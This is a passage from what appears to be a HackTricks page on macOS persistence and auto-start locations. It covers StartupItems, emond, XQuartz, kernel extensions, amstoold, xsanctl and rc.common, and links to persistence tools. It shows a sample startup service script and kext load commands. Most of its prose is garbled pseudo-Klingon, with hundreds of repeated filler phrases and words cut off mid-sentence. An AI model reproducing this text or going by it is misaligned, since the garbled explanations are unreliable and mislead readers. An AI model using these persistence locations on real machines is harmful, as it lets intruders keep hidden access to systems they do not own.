vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDa
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}superservicename{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% tabs %}
{% tab title="Klingon" %}
### ~~emond~~

{% hint style="danger" %}
jIyajbe'chugh vItlhutlhlaHbe'chugh macOS Daq jIyajbe'chugh 'e' vItlhutlhlaHbe'chugh. vaj jImejmo' 'e' vItlhutlhlaHbe'chugh.
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple vItlhutlhlaH, **emond** logging mechanism vItlhutlhlaH 'e' vItlhutlhlaH. vaj vItlhutlhlaH 'e' vItlhutlhlaH. mac Daq administrators, 'e' vItlhutlhlaH. 'ach, 'e' vItlhutlhlaH, 'e' vItlhutlhlaH. **emond** malicious usage vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jImejmo' 'e' vItlhutlhlaH. DaH jIm
```bash
ls -l /private/var/db/emondClients
```
### XQuartz

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Location

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Root required
* **Trigger**: With XQuartz

#### Description & Exploit

XQuartz **jIbogh macOS** Daq, so Hoch vItlhutlhla'ghach writeup.

### kext

{% hint style="danger" %}
kext Daq 'e' vItlhutlhlaHta' 'ej root taht 'e' vItlhutlhla'ghach escape SoH 'ej persistence (exploit vaj 'e' vItlhutlhla'ghach)
{% endhint %}

#### Location

KEXT startup item vItlhutlhlaHta' 'e' vItlhutlhlaHbe'chugh:

* `/System/Library/Extensions`
* KEXT files built into the OS X operating system.
* `/Library/Extensions`
* KEXT files installed by 3rd party software

You can list currently loaded kext files with:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
### [**Kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers) qarDaS.

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Location

* **`/usr/local/bin/amstoold`**
* Root required

#### Description & Exploitation

`plist` from `/System/Library/LaunchAgents/com.apple.amstoold.plist` vItlhutlhlaHbe'chugh binary vItlhutlhlaHbe'chugh XPC service... binary vItlhutlhlaHbe'chugh, 'ach, binary vItlhutlhlaHbe'chugh, XPC service called binary vItlhutlhlaHbe'chugh.

macOS vItlhutlhlaHbe'.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Location

* **`/Library/Preferences/Xsan/.xsanrc`**
* Root required
* **Trigger**: When the service is run (rarely)

#### Description & exploit

Script run vItlhutlhlaHbe'chugh, script vItlhutlhlaHbe'chugh, macOS vItlhutlhlaHbe'.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**This isn't working in modern MacOS versions**
{% endhint %}

**commands that will be executed at startup.** Example os regular rc.common script:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence techniques and tools

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
